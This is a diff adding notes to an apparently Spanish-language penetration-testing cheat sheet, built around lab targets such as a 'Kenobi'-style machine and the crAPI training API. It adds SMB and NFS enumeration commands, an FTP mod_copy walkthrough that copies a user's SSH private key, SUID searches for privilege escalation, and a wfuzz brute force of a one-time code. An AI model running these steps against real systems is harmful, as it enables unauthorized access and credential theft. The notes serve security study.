@@ -81,7 +81,25 @@ The background color is '#ffffff' for light mode and '#000000' for dark mode.
 
    ```bash
    smbclient //<TARGET_IP>/<SHARE>
-   ```  
+   ```
+
+3. Otra forma de enumera con nmap
+
+   ```bash
+   nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>
+   ```
+
+4. Descargar de forma recursiva el recurso compartido SMB
+
+   ```bash
+   smbget -R smb://<TARGET_IP>/<SHARE>
+   ```
+
+5. Para saber que montajes podemos ver
+
+   ```bash
+   nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP> 
+   ``` 
 
 ## Rockyou
 
@@ -137,16 +155,45 @@ The background color is '#ffffff' for light mode and '#000000' for dark mode.
    sudo mount -t nfs IP:share /tmp/mount/ -nolock
    ```
 
+## FTP
+
+1. Vulnerabilidad en modulo mod_Copy
+
+   - El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO , que se pueden utilizar para copiar archivos o directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede utilizar estos comandos para copiar archivos desde cualquier  parte del sistema de archivos a un destino elegido.
+   - Ejecutamos netcat al puerto 21
+   ```bash
+   nc 10.10.197.227 21
+   ```
+   - Escribimos SITE CPRF y apuntamos la ruta del id_rsa
+   ```bash
+   SITE CPFR /home/kenobi/.ssh/id_rsa
+   ```
+   - Y lo copiamos al temp donde tenemos permisos
+   ```bash
+   SITE CPTO /var/tmp/id_rsa
+   ```
+   - Montemos el directorio /var/tmp en nuestra máquina.
+   ```bash
+   mkdir /mnt/kenobiNFS
+   mount 10.10.197.227:/var /mnt/kenobiNFS
+   ls -la /mnt/kenobiNFS
+   ```
+
 
 ## Linux: Privilege escalation
 
-1. Buscar permisos en todos los archivos SUID
+1. Buscar permisos en todos los archivos SUID:
+   - Los bits SUID pueden ser peligrosos, algunos binarios como passwd    necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.
+
 
    ```bash
    find / -user root -perm -4000 -exec ls -ldb {} \; 
    ```
    ```bash
    find / -perm -u=s -exec ls -l {} \; 2>/dev/null 
+   ```
+   ```bash
+   find / -perm -u=s -type f 2>/dev/null 
    ```
 
 
@@ -409,9 +456,9 @@ The background color is '#ffffff' for light mode and '#000000' for dark mode.
    var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
    ```
    
-## APIs Móvil
+## APIs
 
-1. Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API.
+1. Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles.
 
    - Descarga el .apk usando APKCombo o APKPure.
    - Escaneo de archivos APK en busca de URI, puntos finales y secrets:
@@ -421,6 +468,12 @@ The background color is '#ffffff' for light mode and '#000000' for dark mode.
    - Validar API KEY encontrada con nuclei:
    ```bash
    nuclei -t nuclei-templates/http/token-spray -var token=<API_KEY_FOUND>
+   ```
+
+2. Fuerza bruta.
+
+   ```bash
+   wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
    ```
    
 ## Google Dorks
